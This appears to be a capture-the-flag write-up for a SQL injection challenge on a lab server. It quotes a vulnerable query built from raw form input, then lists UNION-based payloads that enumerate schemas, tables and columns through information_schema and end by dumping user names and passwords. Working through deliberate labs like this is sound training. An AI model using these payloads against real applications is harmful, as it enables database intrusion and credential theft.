# SQLI1

## General information 
url: http://vuln2.redrocket.club:12347/

given: 
```
cursor.execute("SELECT id, title, content FROM articles WHERE public=1 AND id=" + request.form["article_id"])
```

query: 
```SQL
SELECT id, title, content FROM articles WHERE public=1 AND id=" + request.form["article_id"]
```


## Try 1: OR 1
```SQL
' OR 1 # didn't work 
```

## Try 2: Union method 

## try union method: 

show article id 1:
```SQL
0 UNION SELECT id, title, content FROM articles LIMIT 0,1
```

Look at other articles counting up the LIMIT: 
```SQL
0 UNION SELECT id, title, content FROM articles LIMIT 1,2
```

### Systematically get information about database: 

#### query schematas: 
```SQL
0 union select schema_name, 2, 3 from information_schema.schemata LIMIT 0,1
```

Count up the LIMIT e.g. LIMIT 1,2 to see other schematas: 

all schematas: 
* mysql
* information_schema
* performance_schema
* sys
* news

Schema news sounds like it is not a system schema. 

#### query tables from the news schema: 
```SQL
0 union select table_name, 2, 3 from information_schema.tables where table_schema='news' limit 0,1
```

tables in schema news: 
* articles
* userdatathatisvaluable

#### columns in table userdatathatisvaluable: 
```SQL
0 union select column_name, 2, 3 from information_schema.columns where table_name="userdatathatisvaluable" limit 0,1
```
columns in userdatathatisvaluable: 
* id 
* name 
* password 

#### hack userdatathatisvaluable: 
```SQL
0 union select id, name, password from userdatathatisvaluable limit 0,1
```





